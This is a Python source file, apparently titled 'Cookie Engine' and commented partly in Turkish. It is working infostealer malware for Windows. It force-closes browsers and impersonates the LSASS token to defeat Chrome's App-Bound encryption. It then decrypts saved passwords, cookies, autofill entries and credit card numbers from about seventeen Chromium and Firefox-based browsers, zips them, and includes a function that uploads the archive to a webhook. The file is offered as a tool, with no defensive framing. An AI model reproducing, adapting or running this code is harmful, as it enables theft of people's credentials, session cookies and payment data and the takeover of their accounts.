import os
import argparse
import io
import json
import struct
import ctypes
import shutil
import sqlite3
import pathlib
import binascii
import subprocess
import zipfile
import time
from io import BytesIO
import windows
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import multiprocessing
import sys
import urllib.request
import urllib.parse
import hashlib
import hmac
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad
import base64

multiprocessing.freeze_support()




# Tüm desteklenen tarayıcılar
BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1',
        'chromium_based': True
    },
    'brave': {
        'name': 'Brave',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1',
        'chromium_based': True
    },
    'edge': {
        'name': 'Microsoft Edge',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1',
        'chromium_based': True
    },
    'opera': {
        'name': 'Opera',
        'data_path': [r'AppData\Roaming\Opera Software\Opera Stable', r'AppData\Local\Opera Software\Opera Stable'],
        'local_state': [r'AppData\Roaming\Opera Software\Opera Stable\Local State', r'AppData\Local\Opera Software\Opera Stable\Local State'],
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1',
        'chromium_based': True
    },
    'opera_gx': {
        'name': 'Opera GX',
        'data_path': [r'AppData\Roaming\Opera Software\Opera GX Stable', r'AppData\Local\Opera Software\Opera GX Stable'],
        'local_state': [r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', r'AppData\Local\Opera Software\Opera GX Stable\Local State'],
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1',
        'chromium_based': True
    },
    'yandex': {
        'name': 'Yandex Browser',
        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandexkey1',
        'chromium_based': True
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1',
        'chromium_based': True
    },
    'chromium': {
        'name': 'Chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chromium.exe',
        'key_name': 'Chromiumkey1',
        'chromium_based': True
    },
    'sputnik': {
        'name': 'Sputnik',
        'data_path': r'AppData\Local\Sputnik\Sputnik\User Data',
        'local_state': r'AppData\Local\Sputnik\Sputnik\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Sputnikkey1',
        'chromium_based': True
    },
    '7star': {
        'name': '7Star',
        'data_path': r'AppData\Local\7Star\7Star\User Data',
        'local_state': r'AppData\Local\7Star\7Star\User Data\Local State',
        'process_name': '7star.exe',
        'key_name': '7Starkey1',
        'chromium_based': True
    },
    'orbitum': {
        'name': 'Orbitum',
        'data_path': r'AppData\Local\Orbitum\User Data',
        'local_state': r'AppData\Local\Orbitum\User Data\Local State',
        'process_name': 'orbitum.exe',
        'key_name': 'Orbitumkey1',
        'chromium_based': True
    },
    'epic': {
        'name': 'Epic Privacy Browser',
        'data_path': r'AppData\Local\Epic Privacy Browser\User Data',
        'local_state': r'AppData\Local\Epic Privacy Browser\User Data\Local State',
        'process_name': 'epic.exe',
        'key_name': 'Epic Privacy Browserkey1',
        'chromium_based': True
    },
    'amigo': {
        'name': 'Amigo',
        'data_path': r'AppData\Local\Amigo\User Data',
        'local_state': r'AppData\Local\Amigo\User Data\Local State',
        'process_name': 'amigo.exe',
        'key_name': 'Amigokey1',
        'chromium_based': True
    },
    'torch': {
        'name': 'Torch',
        'data_path': r'AppData\Local\Torch\User Data',
        'local_state': r'AppData\Local\Torch\User Data\Local State',
        'process_name': 'torch.exe',
        'key_name': 'Torchkey1',
        'chromium_based': True
    },
    'kometa': {
        'name': 'Kometa',
        'data_path': r'AppData\Local\Kometa\User Data',
        'local_state': r'AppData\Local\Kometa\User Data\Local State',
        'process_name': 'kometa.exe',
        'key_name': 'Kometakey1',
        'chromium_based': True
    },
    'firefox': {
        'name': 'Mozilla Firefox',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'local_state': None,
        'process_name': 'firefox.exe',
        'chromium_based': False
    },
    'tor': {
        'name': 'Tor Browser',
        'data_path': r'AppData\Roaming\tor-browser\Browser\TorBrowser\Data\Browser\Profiles',
        'local_state': None,
        'process_name': 'firefox.exe',
        'chromium_based': False
    }
}

def get_db_connection(db_path):
    """SQLite bağlantısı kur ve geçici kopyayı temizle"""
    tmp_path = fetch_sqlite_copy(db_path)
    if not tmp_path:
        return None, None
    try:
        conn = sqlite3.connect(str(tmp_path))
        return conn, tmp_path
    except:
        try: os.unlink(tmp_path)
        except: pass
        return None, None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def kill_browser_processes():
    """Tarayıcı process'lerini gizlice kapat"""
    import psutil
    
    browsers_killed = []
    
    for config in BROWSERS.values():
        process_name = config['process_name']
        try:
            # psutil ile process'leri bul ve kapat
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                        proc.kill()
                        browsers_killed.append(process_name)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
        except:
            pass
    
    # Tüm process'lerin kapatılmasını bekle
    if browsers_killed:
        time.sleep(2)

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    except:
        pass
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        parsed_data['raw_data'] = buffer.read()
    return parsed_data

def decrypt_with_cng(input_data, key_name):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
    if status != 0:
        return None
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        ncrypt.NCryptFreeObject(hProvider)
        return None
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return None
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * buffer_size)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                 ctypes.byref(pcbResult), 0x40)
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    if status != 0:
        return None
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes(a ^ b for a, b in zip(ba1, ba2))

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 2:
        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            dec_aes = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not dec_aes:
                return None
        xored = byte_xor(dec_aes, xor_key)
        cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    else:
        print(f"   [!] Unknown flag: {parsed_data.get('flag')}")
        return parsed_data.get('raw_data', b'')

def decrypt_aes_gcm(encrypted_value, master_key):
    try:
        if not encrypted_value or len(encrypted_value) < 31: # 3 prefix + 12 IV + 16 Tag
            return None
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(payload, tag)
    except:
        return None

def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if not encrypted_value or encrypted_value[:3] != b'v20':
            return ""
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        # v20 values (cookies/autofill) start after 32 bytes of metadata
        return decrypted[32:].decode('utf-8', errors='replace')
    except:
        return "DECRYPT_FAILED"

def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if not encrypted_value or encrypted_value[:3] != b'v20':
            return ""
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        # v20 passwords contain raw data without prefix
        return decrypted.decode('utf-8', errors='replace')
    except:
        return "DECRYPT_FAILED"

def fetch_sqlite_copy(db_path: pathlib.Path):
    if not db_path.exists():
        return None
    tmp_name = f"tmp_{os.urandom(8).hex()}_{db_path.name}"
    tmp_path = pathlib.Path(os.environ['TEMP']) / tmp_name
    try:
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except:
        return None

def extract_chromium_bookmarks(profile_path):
    bookmarks_path = profile_path / "Bookmarks"
    if not bookmarks_path.exists():
        return ""
    try:
        with open(bookmarks_path, "r", encoding="utf-8", errors="ignore") as f:
            data = json.load(f)
        bookmarks = []
        def process_node(node):
            if isinstance(node, dict):
                if node.get("type") == "url":
                    name = node.get("name", "Unknown")
                    url = node.get("url", "Unknown")
                    bookmarks.append(f"Name: {name}\nURL: {url}\n")
                if "children" in node:
                    for child in node["children"]:
                        process_node(child)
        if "roots" in data:
            for root in data["roots"].values():
                process_node(root)
        return "\n".join(bookmarks)
    except:
        return ""

def get_master_key(config):
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_paths = config['local_state']
        if isinstance(local_state_paths, str):
            local_state_paths = [local_state_paths]
        
        local_state_path = None
        for path_str in local_state_paths:
            p = pathlib.Path(user_profile) / path_str
            if p.exists():
                local_state_path = p
                break
        
        if not local_state_path:
            return None
            
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state:
            return None
        if 'app_bound_encrypted_key' in local_state['os_crypt']:
            print(f"   [*] Detected v20 (App-Bound) encryption for {config['name']}")
            enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
        elif 'encrypted_key' in local_state['os_crypt']:
            print(f"   [*] Detected v10 (DPAPI) encryption for {config['name']}")
            enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
            return windows.crypto.dpapi.unprotect(enc_key)
        else:
            return None

        print(f"   [*] Attempting App-Bound decryption...")
        try:
            with impersonate_lsass():
                print(f"   [*] Impersonated LSASS, unprotecting system DPAPI...")
                system_dec = windows.crypto.dpapi.unprotect(enc_key)
            print(f"   [*] Unprotecting user DPAPI...")
            user_dec = windows.crypto.dpapi.unprotect(system_dec)
            parsed = parse_key_blob(user_dec)
            if parsed['flag'] not in (1, 2, 3):
                return user_dec[-32:]
            print(f"   [*] Attempting App-Bound decryption with key: {config['key_name']}...")
            return derive_v20_master_key(parsed, config['key_name'])
        except Exception as inner_e:
            print(f"   [!] App-Bound decryption failed: {inner_e}")
            return None
    except Exception as e:
        print(f"   [!] Master key retrieval failed: {e}")
        return None

def write_to_zip(zf, zip_path: str, content: str):
    if content.strip():
        zf.writestr(zip_path, content.encode('utf-8'))

def process_chromium_browser(browser_name, config, master_key, zf):
    user_profile = os.environ['USERPROFILE']
    data_paths = config['data_path']
    if isinstance(data_paths, str):
        data_paths = [data_paths]
    
    for path_str in data_paths:
        data_path = pathlib.Path(user_profile) / path_str
        if not data_path.exists():
            continue
        
        # Tüm profil klasörlerini al
        profiles = [p for p in data_path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile ") or "profile" in p.name.lower())]

        # Opera/Opera GX fallback: Eğer profil klasörü bulunamazsa ve ana dizinde kritik dosyalar varsa, ana dizini profil say
        if not profiles:
            profile_indicators = ["Login Data", "Cookies", "Web Data", "Network/Cookies", "Network\\Cookies"]
            if any((data_path / ind).exists() for ind in profile_indicators):
                profiles = [data_path]

        for profile_dir in profiles:
            profile_name = profile_dir.name
            # Avoid long folder names for prefix
            p_name = profile_name if len(profile_name) < 20 else profile_name[:17] + "..."
            prefix = f"{browser_name}/{p_name}/"

            # Passwords
            passwords_content = ""
            login_db = profile_dir / "Login Data"
            if login_db.exists():
                conn, tmp_path = get_db_connection(login_db)
                if conn:
                    try:
                        cur = conn.cursor()
                        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0")
                        for url, user, pw in cur.fetchall():
                            # v20 encryption
                            if pw.startswith(b'v20'):
                                dec = decrypt_v20_password(pw, master_key)
                                if dec and dec != "DECRYPT_FAILED":
                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
                            # v10 encryption (older Chrome + DPAPI)
                            elif pw.startswith(b'v10'):
                                try:
                                    dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
                                except: pass
                            # Legacy DPAPI (unprefixed)
                            else:
                                try:
                                    dec = windows.crypto.dpapi.unprotect(pw).decode('utf-8', errors='replace')
                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
                                except: pass
                        conn.close()
                        if passwords_content.strip():
                            write_to_zip(zf, prefix + "passwords.txt", passwords_content)
                    except: pass
                    finally:
                        if tmp_path and tmp_path.exists(): os.unlink(tmp_path)

            # Cookies
            cookies_content = ""
            # Chrome/Edge/Brave structure: profile/Network/Cookies
            # Opera structure: profile/Cookies
            cookie_paths = [profile_dir / "Network" / "Cookies", profile_dir / "Cookies"]
            for cookies_db in cookie_paths:
                if cookies_db.exists():
                    conn, tmp_path = get_db_connection(cookies_db)
                    if conn:
                        try:
                            cur = conn.cursor()
                            cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies")
                            for host, name, path, exp, sec, httpo, enc in cur.fetchall():
                                if not enc: continue
                                
                                dec = None
                                if enc.startswith(b'v20'):
                                    dec = decrypt_v20_value(enc, master_key)
                                elif enc.startswith(b'v10'):
                                    try:
                                        dec = windows.crypto.dpapi.unprotect(enc[3:]).decode('utf-8', errors='replace')
                                    except:
                                        # Fallback to v20 decryption if legacy DPAPI fails (some modern builds)
                                        dec = decrypt_v20_value(enc, master_key)
                                else:
                                    try:
                                        dec = windows.crypto.dpapi.unprotect(enc).decode('utf-8', errors='replace')
                                    except: pass
                                
                                if dec and dec != "DECRYPT_FAILED" and name and host:
                                    # URL-encode for safety
                                    safe_dec = urllib.parse.quote(dec)
                                    
                                    # Check size limit
                                    if len(safe_dec) > 4096:
                                        compact_dec = dec.replace('\n', '').replace('\r', '').replace('\t', ' ').replace(';', '%3B')
                                        if len(compact_dec) <= 4096:
                                            safe_dec = compact_dec
                                        else:
                                            continue 

                                    # Cleanup other fields to prevent format breakage
                                    name_s = str(name).replace('\t', ' ').replace('\n', '').replace('\r', '')
                                    host_s = str(host).replace('\t', ' ').replace('\n', '').replace('\r', '')
                                    path_s = str(path if path else "/").replace('\t', ' ').replace('\n', '').replace('\r', '')

                                    # Convert Chromium timestamp (microseconds since 1601) to Unix timestamp (seconds since 1970)
                                    try:
                                        secs = int(exp) // 1000000
                                        unix_exp = secs - 11644473600 if secs > 11644473600 else 0
                                    except:
                                        unix_exp = 0

                                    line = f"{host_s}\tTRUE\t{path_s}\t{str(bool(sec)).upper()}\t{unix_exp}\t{name_s}\t{safe_dec}\n"
                                    cookies_content += line
                            conn.close()
                            if cookies_content.strip():
                                write_to_zip(zf, prefix + "cookies.txt", cookies_content)
                                break # Found cookies, no need to check other paths
                        except: pass
                        finally:
                            if tmp_path and tmp_path.exists(): os.unlink(tmp_path)

            # Credit Cards & Autofill
            autofill_content = ""
            credit_cards_content = ""
            webdata_db = profile_dir / "Web Data"
            if webdata_db.exists():
                conn, tmp_path = get_db_connection(webdata_db)
                if conn:
                    try:
                        cur = conn.cursor()
                        
                        # Local CVCs
                        local_cvcs = {}
                        try:
                            cur.execute("SELECT guid, CAST(value_encrypted AS BLOB) FROM local_stored_cvc")
                            for guid, encrypted in cur.fetchall():
                                local_cvcs[guid] = encrypted
                        except: pass

                        # Autofill
                        try:
                            cur.execute("SELECT name, value FROM autofill")
                            for name, val in cur.fetchall():
                                if name:
                                    if isinstance(val, bytes) and val.startswith(b'v20'):
                                        dec = decrypt_v20_value(val, master_key)
                                    elif isinstance(val, bytes) and val.startswith(b'v10'):
                                        try: dec = windows.crypto.dpapi.unprotect(val[3:]).decode('utf-8', errors='replace')
                                        except: dec = str(val)
                                    else:
                                        dec = str(val) if val else ""
                                    autofill_content += f"Field: {name}\nValue: {dec}\n\n"
                        except: pass
                        
                        # Credit Cards
                        try:
                            cur.execute("SELECT name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) FROM credit_cards")
                            for name, exp_m, exp_y, enc_num in cur.fetchall():
                                dec_num = "Unknown"
                                if enc_num and enc_num.startswith(b'v20'):
                                    dec_num = decrypt_v20_password(enc_num, master_key) 
                                elif enc_num and enc_num.startswith(b'v10'):
                                    try: dec_num = windows.crypto.dpapi.unprotect(enc_num[3:]).decode('utf-8', errors='replace')
                                    except: pass
                                
                                credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
                        except: pass

                        conn.close()
                        if autofill_content:
                            write_to_zip(zf, prefix + "auto_fills.txt", autofill_content)
                        if credit_cards_content:
                            write_to_zip(zf, prefix + "credit_cards.txt", credit_cards_content)
                    except: pass
                    finally:
                        if tmp_path and tmp_path.exists(): os.unlink(tmp_path)

            # Bookmarks
            bookmarks_content = extract_chromium_bookmarks(profile_dir)
            if bookmarks_content:
                write_to_zip(zf, prefix + "bookmarks.txt", bookmarks_content)


def process_firefox_browser(browser_name, config, zf):
    user_profile = os.environ['USERPROFILE']
    profiles_path = pathlib.Path(user_profile) / config['data_path']
    if not profiles_path.exists(): return

    # NSS structures
    class SECItem(ctypes.Structure):
        _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]

    # Load NSS
    nss_dll = None
    for p in [r"C:\Program Files\Mozilla Firefox\nss3.dll", r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"]:
        if os.path.exists(p):
            try: nss_dll = ctypes.CDLL(p); break
            except: pass

    profile_dirs = [p for p in profiles_path.iterdir() if p.is_dir() and ('default' in p.name.lower() or 'release' in p.name.lower() or 'beta' in p.name.lower())]

    for profile_dir in profile_dirs:
        prefix = f"{browser_name}/{profile_dir.name}/"
        
        # Cookies
        cookies_content = ""
        cookies_db = profile_dir / "cookies.sqlite"
        if cookies_db.exists():
            try:
                con = sqlite3.connect(str(cookies_db))
                cur = con.cursor()
                cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                for host, name, value, path, expiry, secure in cur.fetchall():
                    if not host or not name or not value:
                        continue

                    # URL-encode value for maximum compatibility
                    safe_val = urllib.parse.quote(value)
                    
                    # Check size limit
                    if len(safe_val) > 4096:
                        compact_val = value.replace('\n', '').replace('\r', '').replace('\t', ' ').replace(';', '%3B')
                        if len(compact_val) <= 4096:
                            safe_val = compact_val
                        else:
                            continue

                    # Cleanup other fields
                    host_c = str(host).replace('\t', ' ').replace('\n', '').replace('\r', '')
                    name_c = str(name).replace('\t', ' ').replace('\n', '').replace('\r', '')
                    path_c = str(path).replace('\t', ' ').replace('\n', '').replace('\r', '')

                    cookies_content += f"{host_c}\tTRUE\t{path_c}\t{str(bool(secure)).upper()}\t{expiry}\t{name_c}\t{safe_val}\n"
                con.close()
                if cookies_content: write_to_zip(zf, prefix + "cookies.txt", cookies_content)
            except: pass

        # Passwords (Decryption with NSS)
        passwords_content = ""
        logins_json = profile_dir / "logins.json"
        
        # Add Raw Files
        if logins_json.exists(): 
            try: zf.write(logins_json, prefix + "raw/logins.json")
            except: pass
        if (profile_dir / "key4.db").exists():
            try: zf.write(profile_dir / "key4.db", prefix + "raw/key4.db")
            except: pass

        if logins_json.exists() and nss_dll:
            try:
                # NSS Init
                if nss_dll.NSS_Init(str(profile_dir).encode('utf-8')) == 0:
                    with open(logins_json, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    
                    for entry in data.get("logins", []):
                        url = entry.get('hostname', '')
                        user = entry.get('username', '')
                        enc_pass = entry.get('encryptedPassword', entry.get('password', ''))
                        
                        decrypted = "Failed to decrypt"
                        if enc_pass:
                            try:
                                dec_data = base64.b64decode(enc_pass)
                                inp = SECItem(0, ctypes.cast(ctypes.create_string_buffer(dec_data), ctypes.c_void_p), len(dec_data))
                                out = SECItem(0, 0, 0)
                                if nss_dll.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
                                    decrypted = ctypes.string_at(out.data, out.len).decode('utf-8')
                            except: pass
                        
                        passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {decrypted}\n\n"
                    
                    nss_dll.NSS_Shutdown()
            except: pass
        
        # Fallback if NSS failed or not found
        if not passwords_content and logins_json.exists():
            try:
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    passwords_content += f"URL: {entry.get('hostname')}\nUser: {entry.get('username')}\nPass: {entry.get('encryptedPassword')} (Encrypted - NSS DLL missing)\n\n"
            except: pass
            
            if passwords_content.strip():
                print(f"   [+] {profile_dir.name}: Extracted {passwords_content.count('URL:')} passwords")
                write_to_zip(zf, prefix + "passwords.txt", passwords_content)
            
        # Bookmarks (Firefox)
        bookmarks_content = ""
        places_db = profile_dir / "places.sqlite"
        if places_db.exists():
            try:
                conn, tmp_path = get_db_connection(places_db)
                if conn:
                    cur = conn.cursor()
                    cur.execute("""
                        SELECT b.title, p.url 
                        FROM moz_bookmarks b 
                        JOIN moz_places p ON b.fk = p.id 
                        WHERE b.title IS NOT NULL
                    """)
                    for title, url in cur.fetchall():
                        bookmarks_content += f"Title: {title}\nURL: {url}\n\n"
                    conn.close()
                    if bookmarks_content.strip():
                        write_to_zip(zf, prefix + "bookmarks.txt", bookmarks_content)
                    if tmp_path.exists(): os.unlink(tmp_path)
            except: pass

def send_to_webhook(zip_path, webhook_url):
    if not os.path.exists(zip_path):
        return

    try:
        boundary = '----WebKitFormBoundary' + binascii.hexlify(os.urandom(16)).decode('ascii')
        
        with open(zip_path, 'rb') as f:
            file_content = f.read()
            
        # Multipart/form-data body oluşturma
        body = []
        body.append(f'--{boundary}'.encode('utf-8'))
        body.append(f'Content-Disposition: form-data; name="file"; filename="browsers.zip"'.encode('utf-8'))
        body.append('Content-Type: application/zip'.encode('utf-8'))
        body.append(b'')
        body.append(file_content)
        body.append(f'--{boundary}--'.encode('utf-8'))
        body.append(b'')
        
        body_bytes = b'\r\n'.join(body)
        
        req = urllib.request.Request(webhook_url, data=body_bytes)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        with urllib.request.urlopen(req) as response:
            pass
            
    except:
        pass

def main():
    print(f"Cookie Engine Started")
    print(f" Scanning browsers...")
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', nargs='?', default='all')
    parser.add_argument('--fingerprint', action='store_true')
    parser.add_argument('--output-path', required=False)
    args = parser.parse_args()

    try:
        kill_browser_processes()
        time.sleep(1)
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for n, c in BROWSERS.items():
                try:
                    print(f"Processing {c['name']}...")
                    if c['chromium_based']:
                        mk = get_master_key(c)
                        if mk: 
                            process_chromium_browser(n, c, mk, zf)
                        else:
                            print(f"   [!] Failed to get master key for {c['name']}")
                    else:
                        process_firefox_browser(n, c, zf)
                except Exception as e: 
                    print(f"   [!] Error in browser {n}: {e}")

        out = args.output_path if args.output_path else "output.zip"
        if os.path.dirname(out): os.makedirs(os.path.dirname(out), exist_ok=True)
        
        with open(out, "wb") as f:
            f.write(zip_buffer.getvalue())
        print(f"Successfully saved to {out}")
    except Exception as e:
        print(f"CRITICAL ERROR in main loop: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
